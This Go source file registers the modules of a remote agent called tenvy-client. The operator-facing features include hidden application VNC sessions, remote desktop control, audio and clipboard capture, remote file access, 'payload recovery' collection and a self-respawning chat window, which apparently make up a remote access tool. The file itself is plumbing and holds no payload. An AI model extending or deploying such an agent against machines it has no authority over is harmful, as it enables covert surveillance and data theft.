package agent

import (
	"context"
	"errors"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	appvnc "github.com/rootbay/tenvy-client/internal/modules/control/appvnc"
	audioctrl "github.com/rootbay/tenvy-client/internal/modules/control/audio"
	remotedesktop "github.com/rootbay/tenvy-client/internal/modules/control/remotedesktop"
	clipboard "github.com/rootbay/tenvy-client/internal/modules/management/clipboard"
	filemanager "github.com/rootbay/tenvy-client/internal/modules/management/filemanager"
	tcpconnections "github.com/rootbay/tenvy-client/internal/modules/management/tcpconnections"
	clientchat "github.com/rootbay/tenvy-client/internal/modules/misc/clientchat"
	recovery "github.com/rootbay/tenvy-client/internal/modules/operations/recovery"
	systeminfo "github.com/rootbay/tenvy-client/internal/modules/systeminfo"
	"github.com/rootbay/tenvy-client/internal/plugins"
	"github.com/rootbay/tenvy-client/internal/protocol"
)

type ModuleRuntime struct {
	AgentID      string
	BaseURL      string
	AuthKey      string
	HTTPClient   *http.Client
	Logger       *log.Logger
	UserAgent    string
	Provider     systeminfo.AgentInfoProvider
	BuildVersion string
	Config       protocol.AgentConfig
	Plugins      *plugins.Manager
}

func envBool(name string) bool {
	value := strings.TrimSpace(os.Getenv(name))
	switch strings.ToLower(value) {
	case "1", "true", "yes", "on":
		return true
	default:
		return false
	}
}

func envDuration(name string) time.Duration {
	value := strings.TrimSpace(os.Getenv(name))
	if value == "" {
		return 0
	}
	d, err := time.ParseDuration(value)
	if err != nil {
		return 0
	}
	return d
}

func envList(name string) []string {
	raw := os.Getenv(name)
	if strings.TrimSpace(raw) == "" {
		return nil
	}

	parts := strings.FieldsFunc(raw, func(r rune) bool {
		switch r {
		case ',', ';', '\n', '\r', '\t', ' ':
			return true
		default:
			return false
		}
	})

	if len(parts) == 0 {
		return nil
	}

	values := make([]string, 0, len(parts))
	for _, part := range parts {
		trimmed := strings.TrimSpace(part)
		if trimmed != "" {
			values = append(values, trimmed)
		}
	}
	if len(values) == 0 {
		return nil
	}
	return values
}

type ModuleCapability struct {
	Name        string
	Description string
}

type ModuleMetadata struct {
	ID           string
	Title        string
	Description  string
	Commands     []string
	Capabilities []ModuleCapability
}

type Module interface {
	Metadata() ModuleMetadata
	Init(context.Context, ModuleRuntime) error
	Handle(context.Context, protocol.Command) protocol.CommandResult
	UpdateConfig(context.Context, ModuleRuntime) error
	Shutdown(context.Context)
}

type moduleEntry struct {
	module   Module
	metadata ModuleMetadata
	commands []string
}

type moduleManager struct {
	mu        sync.RWMutex
	modules   map[string]*moduleEntry
	lifecycle []*moduleEntry
	remote    *remoteDesktopModule
}

func newDefaultModuleManager() *moduleManager {
	registry := newModuleManager()
	registry.register(&appVncModule{})
	registry.register(newRemoteDesktopModule(nil))
	registry.register(&audioModule{})
	registry.register(&clipboardModule{})
	registry.register(&fileManagerModule{})
	registry.register(&tcpConnectionsModule{})
	registry.register(&clientChatModule{})
	registry.register(&recoveryModule{})
	registry.register(&systemInfoModule{})
	return registry
}

func newModuleManager() *moduleManager {
	return &moduleManager{
		modules:   make(map[string]*moduleEntry),
		lifecycle: make([]*moduleEntry, 0, 6),
	}
}

func (r *moduleManager) register(m Module) {
	metadata := m.Metadata()
	if strings.TrimSpace(metadata.ID) == "" {
		panic("agent module missing metadata id")
	}
	commands := metadata.Commands
	if len(commands) == 0 {
		panic(fmt.Sprintf("agent module %s does not declare any commands", metadata.ID))
	}
	entry := &moduleEntry{
		module:   m,
		metadata: metadata,
		commands: append([]string(nil), commands...),
	}
	if remote, ok := m.(*remoteDesktopModule); ok {
		r.remote = remote
	}
	r.lifecycle = append(r.lifecycle, entry)
	for _, command := range entry.commands {
		if strings.TrimSpace(command) == "" {
			continue
		}
		if existing, ok := r.modules[command]; ok {
			panic(fmt.Sprintf("command %q already registered by module %s", command, existing.metadata.ID))
		}
		r.modules[command] = entry
	}
}

func (r *moduleManager) Init(ctx context.Context, runtime ModuleRuntime) error {
	r.mu.Lock()
	defer r.mu.Unlock()

	var errs []error
	for _, entry := range r.lifecycle {
		if err := entry.module.Init(ctx, runtime); err != nil {
			label := entry.metadata.Title
			if strings.TrimSpace(label) == "" {
				label = entry.metadata.ID
			}
			errs = append(errs, fmt.Errorf("%s: %w", label, err))
		}
	}

	return errors.Join(errs...)
}

func (r *moduleManager) UpdateConfig(ctx context.Context, runtime ModuleRuntime) error {
	r.mu.Lock()
	defer r.mu.Unlock()

	var errs []error
	for _, entry := range r.lifecycle {
		if err := entry.module.UpdateConfig(ctx, runtime); err != nil {
			label := entry.metadata.Title
			if strings.TrimSpace(label) == "" {
				label = entry.metadata.ID
			}
			errs = append(errs, fmt.Errorf("%s: %w", label, err))
		}
	}

	return errors.Join(errs...)
}

func (r *moduleManager) Metadata() []ModuleMetadata {
	r.mu.RLock()
	defer r.mu.RUnlock()

	metadata := make([]ModuleMetadata, 0, len(r.lifecycle))
	for _, entry := range r.lifecycle {
		metadata = append(metadata, entry.metadata)
	}
	return metadata
}

func (r *moduleManager) HandleCommand(ctx context.Context, cmd protocol.Command) (bool, protocol.CommandResult) {
	r.mu.RLock()
	entry, ok := r.modules[cmd.Name]
	r.mu.RUnlock()
	if !ok {
		return false, protocol.CommandResult{}
	}
	return true, entry.module.Handle(ctx, cmd)
}

func (r *moduleManager) Shutdown(ctx context.Context) {
	r.mu.RLock()
	entries := append([]*moduleEntry(nil), r.lifecycle...)
	r.mu.RUnlock()

	for index := len(entries) - 1; index >= 0; index-- {
		entries[index].module.Shutdown(ctx)
	}
}

func (r *moduleManager) remoteDesktopModule() *remoteDesktopModule {
	r.mu.RLock()
	defer r.mu.RUnlock()
	return r.remote
}

type appVncModule struct {
	controller *appvnc.Controller
}

func (m *appVncModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "app-vnc",
		Title:       "Application VNC",
		Description: "Launches curated applications inside a disposable workspace and streams them through VNC.",
		Commands:    []string{"app-vnc"},
		Capabilities: []ModuleCapability{
			{
				Name:        "app-vnc.launch",
				Description: "Clone per-application profiles and start virtualized sessions.",
			},
		},
	}
}

func (m *appVncModule) ensureController() *appvnc.Controller {
	if m.controller == nil {
		m.controller = appvnc.NewController()
	}
	return m.controller
}

func (m *appVncModule) Init(_ context.Context, runtime ModuleRuntime) error {
	return m.configure(runtime)
}

func (m *appVncModule) UpdateConfig(_ context.Context, runtime ModuleRuntime) error {
	return m.configure(runtime)
}

func (m *appVncModule) configure(runtime ModuleRuntime) error {
	controller := m.ensureController()
	root := filepath.Join(os.TempDir(), "tenvy-appvnc")
	if err := os.MkdirAll(root, 0o755); err != nil {
		return fmt.Errorf("prepare app-vnc workspace root: %w", err)
	}
	controller.Update(appvnc.Config{
		Logger:        runtime.Logger,
		WorkspaceRoot: root,
	})
	return nil
}

func (m *appVncModule) Handle(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
	controller := m.ensureController()
	if controller == nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "app-vnc controller unavailable",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}
	return controller.HandleCommand(ctx, cmd)
}

func (m *appVncModule) Shutdown(ctx context.Context) {
	if m.controller != nil {
		m.controller.Shutdown(ctx)
	}
}

func (a *Agent) moduleRuntime() ModuleRuntime {
	return ModuleRuntime{
		AgentID:      a.id,
		BaseURL:      a.baseURL,
		AuthKey:      a.key,
		HTTPClient:   a.client,
		Logger:       a.logger,
		UserAgent:    a.userAgent(),
		Provider:     a,
		BuildVersion: a.buildVersion,
		Config:       a.config,
		Plugins:      a.plugins,
	}
}

type remoteDesktopEngineFactory func(context.Context, ModuleRuntime, remotedesktop.Config) (remotedesktop.Engine, string, error)

type remoteDesktopModule struct {
	mu              sync.Mutex
	engine          remotedesktop.Engine
	engineConfig    remotedesktop.Config
	factory         remoteDesktopEngineFactory
	requiredVersion string
}

func newRemoteDesktopModule(engine remotedesktop.Engine) *remoteDesktopModule {
	module := &remoteDesktopModule{factory: defaultRemoteDesktopEngineFactory}
	if engine != nil {
		module.engine = engine
	}
	return module
}

func (m *remoteDesktopModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "remote-desktop",
		Title:       "Remote Desktop",
		Description: "Interactive remote desktop streaming and control.",
		Commands:    []string{"remote-desktop"},
		Capabilities: []ModuleCapability{
			{
				Name:        "remote-desktop.stream",
				Description: "Stream high fidelity desktop frames to the controller UI.",
			},
			{
				Name:        "remote-desktop.input",
				Description: "Relay keyboard and pointer input events back to the host.",
			},
		},
	}
}

func (m *remoteDesktopModule) Init(ctx context.Context, runtime ModuleRuntime) error {
	return m.configure(ctx, runtime)
}

func (m *remoteDesktopModule) UpdateConfig(ctx context.Context, runtime ModuleRuntime) error {
	return m.configure(ctx, runtime)
}

func (m *remoteDesktopModule) configure(ctx context.Context, runtime ModuleRuntime) error {
	var requestTimeout time.Duration
	if runtime.HTTPClient != nil {
		requestTimeout = runtime.HTTPClient.Timeout
	}
	cfg := remotedesktop.Config{
		AgentID:        runtime.AgentID,
		BaseURL:        runtime.BaseURL,
		AuthKey:        runtime.AuthKey,
		Client:         runtime.HTTPClient,
		Logger:         runtime.Logger,
		UserAgent:      runtime.UserAgent,
		RequestTimeout: requestTimeout,
	}
	cfg.QUICInput.URL = os.Getenv("TENVY_REMOTE_DESKTOP_QUIC_URL")
	cfg.QUICInput.Token = os.Getenv("TENVY_REMOTE_DESKTOP_QUIC_TOKEN")
	cfg.QUICInput.ALPN = os.Getenv("TENVY_REMOTE_DESKTOP_QUIC_ALPN")
	cfg.QUICInput.Disabled = envBool("TENVY_REMOTE_DESKTOP_QUIC_DISABLED")
	if d := envDuration("TENVY_REMOTE_DESKTOP_QUIC_CONNECT_TIMEOUT"); d > 0 {
		cfg.QUICInput.ConnectTimeout = d
	}
	if d := envDuration("TENVY_REMOTE_DESKTOP_QUIC_RETRY_INTERVAL"); d > 0 {
		cfg.QUICInput.RetryInterval = d
	}
	if v := strings.TrimSpace(os.Getenv("TENVY_REMOTE_DESKTOP_QUIC_INSECURE")); strings.EqualFold(v, "1") || strings.EqualFold(v, "true") || strings.EqualFold(v, "yes") || strings.EqualFold(v, "on") {
		if runtime.Logger != nil {
			runtime.Logger.Printf("remote desktop: TENVY_REMOTE_DESKTOP_QUIC_INSECURE is no longer supported; TLS validation remains enabled")
		}
	}
	if path := strings.TrimSpace(os.Getenv("TENVY_REMOTE_DESKTOP_QUIC_ROOT_CA_FILE")); path != "" {
		cfg.QUICInput.RootCAFiles = append(cfg.QUICInput.RootCAFiles, path)
	}
	cfg.QUICInput.RootCAFiles = append(cfg.QUICInput.RootCAFiles, envList("TENVY_REMOTE_DESKTOP_QUIC_ROOT_CA_FILES")...)
	if pem := strings.TrimSpace(os.Getenv("TENVY_REMOTE_DESKTOP_QUIC_ROOT_CA_PEM")); pem != "" {
		cfg.QUICInput.RootCAPEMs = append(cfg.QUICInput.RootCAPEMs, pem)
	}
	cfg.QUICInput.RootCAPEMs = append(cfg.QUICInput.RootCAPEMs, envList("TENVY_REMOTE_DESKTOP_QUIC_ROOT_CA_PEMS")...)
	cfg.QUICInput.PinnedSPKIHashes = append(cfg.QUICInput.PinnedSPKIHashes, envList("TENVY_REMOTE_DESKTOP_QUIC_SPKI_HASHES")...)
	cfg.QUICInput.PinnedSPKIHashes = append(cfg.QUICInput.PinnedSPKIHashes, envList("TENVY_REMOTE_DESKTOP_QUIC_PINNED_SPKI_HASHES")...)
	m.mu.Lock()
	factory := m.factory
	engine := m.engine
	version := strings.TrimSpace(m.requiredVersion)
	m.mu.Unlock()

	if version != "" {
		cfg.PluginVersion = version
	}

	if engine == nil {
		if factory == nil {
			factory = defaultRemoteDesktopEngineFactory
		}
		created, stagedVersion, err := factory(ctx, runtime, cfg)
		if err != nil {
			return err
		}
		stagedVersion = strings.TrimSpace(stagedVersion)
		if stagedVersion != "" {
			cfg.PluginVersion = stagedVersion
		}
		if err := created.Configure(cfg); err != nil {
			return err
		}
		m.mu.Lock()
		m.engine = created
		m.engineConfig = cfg
		if stagedVersion != "" {
			m.requiredVersion = stagedVersion
		}
		m.mu.Unlock()
		return nil
	}

	if err := engine.Configure(cfg); err != nil {
		return err
	}
	m.mu.Lock()
	m.engineConfig = cfg
	m.mu.Unlock()
	return nil
}

func (m *remoteDesktopModule) Handle(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
	engine := m.currentEngine()
	if engine == nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "remote desktop subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}
	payload, err := remotedesktop.DecodeCommandPayload(cmd.Payload)
	if err != nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       err.Error(),
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}

	var actionErr error
	switch strings.ToLower(strings.TrimSpace(payload.Action)) {
	case "start":
		actionErr = engine.StartSession(ctx, payload)
	case "stop":
		actionErr = engine.StopSession(payload.SessionID)
	case "configure":
		actionErr = engine.UpdateSession(payload)
	case "input":
		actionErr = engine.HandleInput(ctx, payload)
	default:
		actionErr = fmt.Errorf("unsupported remote desktop action: %s", payload.Action)
	}

	result := protocol.CommandResult{
		CommandID:   cmd.ID,
		CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
	}
	if actionErr != nil {
		result.Success = false
		result.Error = actionErr.Error()
	} else {
		result.Success = true
		result.Output = fmt.Sprintf("remote desktop %s action processed", payload.Action)
	}
	return result
}

func (m *remoteDesktopModule) HandleInputBurst(ctx context.Context, burst protocol.RemoteDesktopInputBurst) error {
	engine := m.currentEngine()
	if engine == nil {
		return errors.New("remote desktop subsystem not initialized")
	}
	if len(burst.Events) == 0 {
		return nil
	}

	events := make([]remotedesktop.RemoteDesktopInputEvent, 0, len(burst.Events))
	for _, evt := range burst.Events {
		event := remotedesktop.RemoteDesktopInputEvent{
			Type:       remotedesktop.RemoteDesktopInputType(evt.Type),
			CapturedAt: evt.CapturedAt,
			X:          evt.X,
			Y:          evt.Y,
			Normalized: evt.Normalized,
			Monitor:    evt.Monitor,
			Button:     remotedesktop.RemoteDesktopMouseButton(evt.Button),
			Pressed:    evt.Pressed,
			DeltaX:     evt.DeltaX,
			DeltaY:     evt.DeltaY,
			DeltaMode:  evt.DeltaMode,
			Key:        evt.Key,
			Code:       evt.Code,
			KeyCode:    evt.KeyCode,
			Repeat:     evt.Repeat,
			AltKey:     evt.AltKey,
			CtrlKey:    evt.CtrlKey,
			ShiftKey:   evt.ShiftKey,
			MetaKey:    evt.MetaKey,
		}
		events = append(events, event)
	}

	payload := remotedesktop.RemoteDesktopCommandPayload{
		Action:    "input",
		SessionID: burst.SessionID,
		Events:    events,
	}

	return engine.HandleInput(ctx, payload)
}

func (m *remoteDesktopModule) Shutdown(context.Context) {
	engine := m.currentEngine()
	if engine != nil {
		engine.Shutdown()
	}
}

func (m *remoteDesktopModule) currentEngine() remotedesktop.Engine {
	m.mu.Lock()
	defer m.mu.Unlock()
	return m.engine
}

func defaultRemoteDesktopEngineFactory(ctx context.Context, runtime ModuleRuntime, cfg remotedesktop.Config) (remotedesktop.Engine, string, error) {
	manager := runtime.Plugins
	client := runtime.HTTPClient
	baseURL := strings.TrimSpace(runtime.BaseURL)
	agentID := strings.TrimSpace(runtime.AgentID)

	fallback := func() (remotedesktop.Engine, string, error) {
		engine := remotedesktop.NewRemoteDesktopStreamer(cfg)
		return engine, "", nil
	}

	if manager == nil || client == nil || baseURL == "" || agentID == "" {
		return fallback()
	}

	stageCtx := ctx
	if stageCtx == nil {
		stageCtx = context.Background()
	}

	stageCtx, cancel := context.WithTimeout(stageCtx, 30*time.Second)
	defer cancel()

	result, err := plugins.StageRemoteDesktopEngine(stageCtx, manager, client, baseURL, agentID, runtime.AuthKey, runtime.UserAgent)
	if err != nil {
		if runtime.Logger != nil {
			runtime.Logger.Printf("remote desktop: engine staging failed: %v", err)
		}
		return fallback()
	}

	version := strings.TrimSpace(result.Manifest.Version)
	engine := remotedesktop.NewManagedRemoteDesktopEngine(result.EntryPath, version, manager, runtime.Logger)
	return engine, version, nil
}

type audioModule struct {
	bridge *audioctrl.AudioBridge
}

func (m *audioModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "audio-control",
		Title:       "Audio Control",
		Description: "Capture and inject audio streams across the remote session.",
		Commands:    []string{"audio-control"},
		Capabilities: []ModuleCapability{
			{
				Name:        "audio.capture",
				Description: "Capture remote system audio for operator playback.",
			},
			{
				Name:        "audio.inject",
				Description: "Inject operator supplied audio into the remote session.",
			},
		},
	}
}

func (m *audioModule) Init(_ context.Context, runtime ModuleRuntime) error {
	return m.configure(runtime)
}

func (m *audioModule) UpdateConfig(_ context.Context, runtime ModuleRuntime) error {
	return m.configure(runtime)
}

func (m *audioModule) configure(runtime ModuleRuntime) error {
	cfg := audioctrl.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.bridge == nil {
		m.bridge = audioctrl.NewAudioBridge(cfg)
		return nil
	}
	m.bridge.UpdateConfig(cfg)
	return nil
}

func (m *audioModule) Handle(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
	if m.bridge == nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "audio subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}
	return m.bridge.HandleCommand(ctx, cmd)
}

func (m *audioModule) Shutdown(context.Context) {
	if m.bridge != nil {
		m.bridge.Shutdown()
	}
}

type clipboardModule struct {
	manager *clipboard.Manager
}

func (m *clipboardModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "clipboard",
		Title:       "Clipboard Manager",
		Description: "Synchronize clipboard data between the operator and remote host.",
		Commands:    []string{"clipboard"},
		Capabilities: []ModuleCapability{
			{
				Name:        "clipboard.capture",
				Description: "Capture clipboard updates emitted by the remote workstation.",
			},
			{
				Name:        "clipboard.push",
				Description: "Push operator provided clipboard payloads to the remote host.",
			},
		},
	}
}

func (m *clipboardModule) Init(_ context.Context, runtime ModuleRuntime) error {
	return m.configure(runtime)
}

func (m *clipboardModule) UpdateConfig(_ context.Context, runtime ModuleRuntime) error {
	return m.configure(runtime)
}

func (m *clipboardModule) configure(runtime ModuleRuntime) error {
	cfg := clipboard.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = clipboard.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *clipboardModule) Handle(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
	if m.manager == nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "clipboard subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}
	return m.manager.HandleCommand(ctx, cmd)
}

func (m *clipboardModule) Shutdown(context.Context) {
	if m.manager != nil {
		m.manager.Shutdown()
	}
}

type fileManagerModule struct {
	manager *filemanager.Manager
}

func (m *fileManagerModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "file-manager",
		Title:       "File Manager",
		Description: "Inspect and manage the remote file system.",
		Commands:    []string{"file-manager"},
		Capabilities: []ModuleCapability{
			{
				Name:        "file-manager.explore",
				Description: "Enumerate directories and retrieve file contents from the host.",
			},
			{
				Name:        "file-manager.modify",
				Description: "Create, update, move, and delete files and directories on demand.",
			},
		},
	}
}

func (m *fileManagerModule) Init(_ context.Context, runtime ModuleRuntime) error {
	return m.configure(runtime)
}

func (m *fileManagerModule) UpdateConfig(_ context.Context, runtime ModuleRuntime) error {
	return m.configure(runtime)
}

func (m *fileManagerModule) configure(runtime ModuleRuntime) error {
	cfg := filemanager.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = filemanager.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *fileManagerModule) Handle(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
	if m.manager == nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "file manager subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}
	return m.manager.HandleCommand(ctx, cmd)
}

func (m *fileManagerModule) Shutdown(context.Context) {
	// no teardown required for file system operations today
}

type tcpConnectionsModule struct {
	manager *tcpconnections.Manager
}

func (m *tcpConnectionsModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "tcp-connections",
		Title:       "TCP Connections",
		Description: "Enumerate and govern active TCP sockets exposed by the host.",
		Commands:    []string{"tcp-connections"},
		Capabilities: []ModuleCapability{
			{
				Name:        "tcp-connections.enumerate",
				Description: "Collect real-time socket state with process attribution.",
			},
			{
				Name:        "tcp-connections.control",
				Description: "Stage enforcement actions for suspicious remote peers.",
			},
		},
	}
}

func (m *tcpConnectionsModule) Init(_ context.Context, runtime ModuleRuntime) error {
	return m.configure(runtime)
}

func (m *tcpConnectionsModule) UpdateConfig(_ context.Context, runtime ModuleRuntime) error {
	return m.configure(runtime)
}

func (m *tcpConnectionsModule) configure(runtime ModuleRuntime) error {
	cfg := tcpconnections.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = tcpconnections.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *tcpConnectionsModule) Handle(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
	if m.manager == nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "tcp connections subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}
	return m.manager.HandleCommand(ctx, cmd)
}

func (m *tcpConnectionsModule) Shutdown(context.Context) {
	// no shutdown hooks required for TCP connection sweeps today
}

type recoveryModule struct {
	manager *recovery.Manager
}

func (m *recoveryModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "recovery",
		Title:       "Recovery Operations",
		Description: "Coordinate staged collection tasks and payload recovery.",
		Commands:    []string{"recovery"},
		Capabilities: []ModuleCapability{
			{
				Name:        "recovery.queue",
				Description: "Queue recovery jobs for background execution.",
			},
			{
				Name:        "recovery.collect",
				Description: "Collect files and artifacts staged by other modules.",
			},
		},
	}
}

func (m *recoveryModule) Init(_ context.Context, runtime ModuleRuntime) error {
	return m.configure(runtime)
}

func (m *recoveryModule) UpdateConfig(_ context.Context, runtime ModuleRuntime) error {
	return m.configure(runtime)
}

func (m *recoveryModule) configure(runtime ModuleRuntime) error {
	cfg := recovery.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = recovery.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *recoveryModule) Handle(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
	if m.manager == nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "recovery subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}
	return m.manager.HandleCommand(ctx, cmd)
}

func (m *recoveryModule) Shutdown(context.Context) {
	if m.manager != nil {
		m.manager.Shutdown()
	}
}

type clientChatModule struct {
	supervisor *clientchat.Supervisor
}

func (m *clientChatModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "client-chat",
		Title:       "Client Chat",
		Description: "Maintain a persistent, controller-managed chat window on the client.",
		Commands:    []string{"client-chat"},
		Capabilities: []ModuleCapability{
			{
				Name:        "client-chat.persist",
				Description: "Respawn the client chat interface if the process terminates unexpectedly.",
			},
			{
				Name:        "client-chat.alias",
				Description: "Apply controller-provided aliases for both participants in real time.",
			},
		},
	}
}

func (m *clientChatModule) Init(_ context.Context, runtime ModuleRuntime) error {
	return m.configure(runtime)
}

func (m *clientChatModule) UpdateConfig(_ context.Context, runtime ModuleRuntime) error {
	return m.configure(runtime)
}

func (m *clientChatModule) configure(runtime ModuleRuntime) error {
	cfg := clientchat.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.supervisor == nil {
		m.supervisor = clientchat.NewSupervisor(cfg)
		return nil
	}
	m.supervisor.UpdateConfig(cfg)
	return nil
}

func (m *clientChatModule) Handle(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
	if m.supervisor == nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "client chat subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}
	return m.supervisor.HandleCommand(ctx, cmd)
}

func (m *clientChatModule) Shutdown(ctx context.Context) {
	if m.supervisor != nil {
		m.supervisor.Shutdown(ctx)
	}
}

type systemInfoModule struct {
	collector *systeminfo.Collector
}

func (m *systemInfoModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "system-info",
		Title:       "System Information",
		Description: "Collect host metadata, hardware configuration, and runtime inventory.",
		Commands:    []string{"system-info"},
		Capabilities: []ModuleCapability{
			{
				Name:        "system-info.snapshot",
				Description: "Provide a structured snapshot of operating system and hardware data.",
			},
			{
				Name:        "system-info.telemetry",
				Description: "Report live telemetry metrics used by other modules for scheduling.",
			},
		},
	}
}

func (m *systemInfoModule) Init(_ context.Context, runtime ModuleRuntime) error {
	return m.configure(runtime)
}

func (m *systemInfoModule) UpdateConfig(_ context.Context, runtime ModuleRuntime) error {
	return m.configure(runtime)
}

func (m *systemInfoModule) configure(runtime ModuleRuntime) error {
	if runtime.Provider == nil {
		return fmt.Errorf("missing agent provider")
	}
	m.collector = systeminfo.NewCollector(runtime.Provider, runtime.BuildVersion)
	return nil
}

func (m *systemInfoModule) Handle(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
	if m.collector == nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "system information subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}
	return m.collector.HandleCommand(ctx, cmd)
}

func (m *systemInfoModule) Shutdown(context.Context) {}
